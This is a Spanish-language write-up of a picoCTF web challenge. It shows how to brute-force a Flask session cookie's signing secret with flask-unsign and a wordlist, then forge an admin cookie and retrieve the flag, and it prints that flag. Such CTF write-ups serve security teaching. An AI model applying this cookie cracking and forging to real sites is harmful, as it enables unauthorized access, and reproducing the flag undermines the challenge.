
## DESCRIPCIÓN
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

http://wily-courier.picoctf.net:59023/
## SOLUCIÓN
Primero ingresamos una cookie cualquiera en el buscador, despues en el inspector encontramos la cookie que se esta utilizando:

```
eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aaiECg.RZh3XmB71os9tpBphu9PymOEXRI
```

Para tratar con la cookie primero hay que descargar en un env la siguiente herramienta:

```
python -m venv ~/.venv

source ~/.venv/bin/activate

pip install flask-unsign
```

Despues creamos un archivo llamado cookies.txt con las cookies posibles que sean la clave, para resolverlo por fuerza bruta:

```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

despues utilizamos la herramienta para encontrar la clave:

```
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aaiECg.RZh3XmB71os9tpBphu9PymOEXRI" --wordlist cookies.txt 
```

y encontramos la clave, la cual es: "wafer"

una vez tenemos la clave, la firmamos en la cookie:

```
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'wafer'
 eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaiEVw.C14kZ_33vpeoRxsjfD5XKYKq34c
```

una vez obtenida la cookie ya firmada en base a admin, lo cargamos en la pagina para obtener la flag:

```
curl http://wily-courier.picoctf.net:52513/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaiEVw.C14kZ_33vpeoRxsjfD5XKYKq34c" | grep picoCTF
```

y obtenemos la flag:

picoCTF{cO0ki3s_yum_f3526545}
## NOTAS ADICIONALES

## REFERENCIAS





